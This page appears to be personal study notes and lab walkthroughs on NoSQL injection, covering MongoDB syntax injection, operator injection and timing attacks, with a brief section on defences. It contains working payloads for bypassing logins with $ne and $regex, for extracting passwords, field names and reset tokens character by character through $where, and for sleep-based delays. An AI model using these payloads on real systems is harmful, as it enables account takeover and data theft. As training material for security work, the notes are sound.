---
layout: default
title: "NoSQL Injection"
parent: "Web Application"
nav_order: 21
---


Two types of NoSQL injection: 
1. Syntax injection - break query syntax, similar to regular SQL injection
	1. But NoSQl db's use a variety of languages, syntax, and data structures
2. Operator injection - occurs when you can use NoSQL operators to manipulate queries 


## Syntax Injection 

1. Systematically test by submitting fuzz string and special characters that trigger a db error 
	- If you know the *API language*, this can speed up

Ex: MongoDB
- `https://insecure-website.com/product/lookup?category=fizzy`
- Product collection in the MongoDB where `this.category == 'fizzy'`
- Ex strings for MongoDB
```
'"`{ 
;$Foo} 
$Foo \xYZ
```
`https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
- This is a URL example, so it's URL-encoded, but NoSQL could also be JSON for example

2. Test which character is interpreted as syntax
- `this.category == '''` for `'`
- `this.category == '\''` for `\`


3. After detecting a vuln, confirm whether you can influence **boolean** conditions
- `' && 0 && 'x` = `https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`
- `' && 1 && 'x` = `https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`
- **The purpose of this is to hope that the false condition affects the query logic, but the true condition doesn't**


4. Once you do this, *attempt to override existing conditions* to exploit the vulnerability
- `'||'1'=='1` = `https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31`
	- which makes `this.category == 'fizzy'||'1'=='1'`
	- *because this is always true*, the query should return all items
- Can also add a **null character** after the category value which can *eliminate additional conditions*
	- Ex: `this.released` restriction (`this.category == 'fizzy' && this.released == 1`)
	- Ex: `https://insecure-website.com/product/lookup?category=fizzy'%00`
		- This removes the need for `this.released` to be set to one, meaning that unreleased products can be shown


## Task 1

- `https://0aab002e03f9280580d2212700930014.web-security-academy.net/filter?category=Gifts` is linked
	- swap `Gifts` out for `'` and notice the error
	- but `%27%2B%27` (`'+'`) doesn't get an error
	- so try to inject true and false conditions: 
		- `Gifts' && 0 && 'x`
			- `Gifts%27%20%26%26%200%20%26%26%20%27x`
		- `Gifts' && 1 && 'x`
			- `Gifts%27%20%26%26%201%20%26%26%20%27x`
		- In this case the former returns 0 but the latter returns gifts
		- **This means we can affect boolean**
	- So try `Gifts%27%7C%7C1%7C%7C%27` (`Gifts'||1||'`), and it works



## NoSQL Operator Injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Ex:
- `$where` - Matches documents that satisfy a **JavaScript** expression.
- `$ne` - Matches all values that are **not equal** to a specified value.
- `$in` - Matches all of the values **specified in an array**.
- `$regex` - Selects documents where values match a specified **regular expression**.

JSON: 
- Insert as nested objects. Ex: 
	- `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`

URL: 
- insert query operators via URL parameters. Ex: 
	- `username=wiener` becomes `username[$ne]=invalid`
- If this doesn't work, you can try the following:
	1. Convert the request method from `GET` to `POST`.
	2. Change the `Content-Type` header to `application/json`.
	3. Add JSON to the message body.
	4. Inject query operators in the JSON.

MongoDB
- `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

## Task 2

```
POST /login HTTP/2
Host: 0a6300e6034f222880c7f38f00b50061.web-security-academy.net
Cookie: session=m3CPDydWLZKvHr6RpXFlPxv7f1fariJ0
Content-Length: 59
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a6300e6034f222880c7f38f00b50061.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6300e6034f222880c7f38f00b50061.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"username":{
"$regex":"admin.*"},"password":{
"$ne":""}}
```
- Basically this didn't work initially because the user is not `administrator`, it's `admingfva3k2p`



## Exploiting syntax injection to extract data

Some query operators or functions can run limited JavaScript code, such as:
- MongoDB's `$where` operator and `mapReduce()`

Consider a vulnerable application that allows users to look up usernames and displays their role:
- `https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the `users` collection:
- `{"$where":"this.username == 'admin'"}`

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. Ex:
- `admin' && this.password[0] == 'a' || 'a'=='b`
- This returns the first character of the user's password string, enabling you to extract the password character by character.

JavaScript `match()` function to extract information. 
- Ex - identify whether the password contains digits:
- `admin' && this.password.match(/\d/) || 'a'=='b`

Identifying fields (MongoDB not as structured)
- Does the db contain a `password` field?
- `https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
- (`https://insecure-website.com/user/lookup?username=admin' && this.password!='`)

## Task 3

yfcsoajg

1. Right-click the `GET /user/lookup?user=wiener` request from history and send to repeater
2. Submit a `'` to show that user input is not sanitized correctly (causes an error)
3. But if you do something like `wiener'+'`, it does work, which indicates a form of server-side injection
4. **Submit a false condition and then a true condition**
	1. **The purpose of this is to determine whether you can do anything else.**
5. Identify password length by `administrator' && this.password.length < 30 || 'a'=='b`
	1. *I failed to do this, but it would have made repeater much faster because I could have run two payloads*
	2. This will return the details for the `administrator` user because the password is less than 30
	3. Go down til you get to 8
6. `administrator' && this.password[§0§]=='§a§` to Intruder
	1. Add `a-z` on the first payload and `0-7` on the second



## Exploiting NoSQL operator injection to extract data
Original query may not use operators, but you might be able to inject one

**Where operator** in MongoDB:
- Consider a app that accepts `{"username":"wiener","password":"peter"}` in POST request
	- `{"username":"wiener","password":"peter", "$where":"0"}`
		- should evaluate to false
	- `{"username":"wiener","password":"peter", "$where":"1"}`
		- should evaluate to true
	- If there is a **difference in responses** then the `where` operator is being evaluated

**Extracting field names**:
- If you have injected an operator that enables you to run JavaScript, *you may be able to use the `keys()` method to extract the name of data fields*.
- Ex:
	- `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
	- Inspects the first data field in the user object and returns the first character of the field name
		- *Allows you to name fields character by character*

**Extracting data using operators**:
- Even if you can't run JS, you may be able to extract other data
- Ex:
	- `{"username":"myuser","password":"mypass"}`
	- Can be `{"username":"admin","password":{"$regex":"^.*"}}`
		- *If you get a different response, the application may be vulnerable* to extracting the password character by character using regex
		- `{"username":"admin","password":{"$regex":"^a*"}}`



## Task 4

"Account locked: please reset your password" when attempting to use JS to enumerate (`"password":{"$ne":"invalid"}`)
- But `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}` returns "Invalid username and password" while 
- `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}` returns account locked 

2. Update to `"$where":"Object.keys(this)[1].match('^.{}.*')"`
	1. This *helps to returns fields for the user object*
3. Cluster bomb: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`
	1. First payload is numbers (of characters in the field)
	2. Second payload is `a-z`, `A-Z`, and `0-9`
4. This returns `username` and subsequent attacks return password, email, and changePwd (`Object.keys(this)[2]` and so on)
	1. changePwd is the password reset token we can use to reset the password to something we like 
5. Then `"$where":"this.changePwd.match('^.{§§}§§.*')"`
	1. We iterate again with payload position 1 being 0-15, and payload 2 being `0-9`, `a-z`, and `A-Z`
		1. could I have just done this with password?
		2. Apparently not
	2. This gives the changePwd token, which we can use on `reset-password`
6. `GET /forgot-password?changePwd=TOKENVALUE` takes us to the reset password page, and we can just make a new one and login

## Timing Delay
`{"$where": "sleep(5000)"}`

Ex which trigger delays when the first letter of the password is `a`:
`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`

`admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`


---

## Additional NoSQL Concepts (THM)

### MongoDB Structure
Information is stored in **documents** rather than tables. Documents are associative arrays with an arbitrary number of fields. **Collections** group related documents (equivalent to tables in relational databases). Multiple collections are grouped into **databases**.

### PHP-Style Query Syntax
MongoDB filters use structured associative arrays:
- `['last_name' => 'Sandler']` — entries with last name Sandler
- `['gender' => 'male', 'last_name' => 'Sandler']` — male entries with that last name
- `['age' => ['$lt' => '50']]` — entries with age under 50

### Operator Injection — Authentication Bypass
If `$user` and `$pass` are taken directly from POST parameters, injecting arrays bypasses login:
- `$user = ['$ne' => 'xxxx']`
- `$pass = ['$ne' => 'yyyy']`

Results in: `['username' => ['$ne' => 'xxxx'], 'password' => ['$ne' => 'yyyy']]`
— returns any document where username and password are not those values.

To cycle through users, use `$nin` to exclude already-found users:
`['username' => ['$nin' => ['admin', 'user2']], 'password' => ['$ne' => 'aweasdf']]`

### Extracting Passwords via Regex
Use regex to enumerate password length and characters:
- Try progressively shorter/longer passwords until the correct length is found
- Then iterate through characters: `['username' => 'admin', 'password' => ['$regex' => '^c.*']]` confirms a password starting with `c`

### Defense
The key remediation is separating query commands from user input using **parameterized queries**. Additionally:
- Use built-in NoSQL functions and filters to avoid Syntax Injection
- Validate and sanitize input to filter out syntax and operator characters
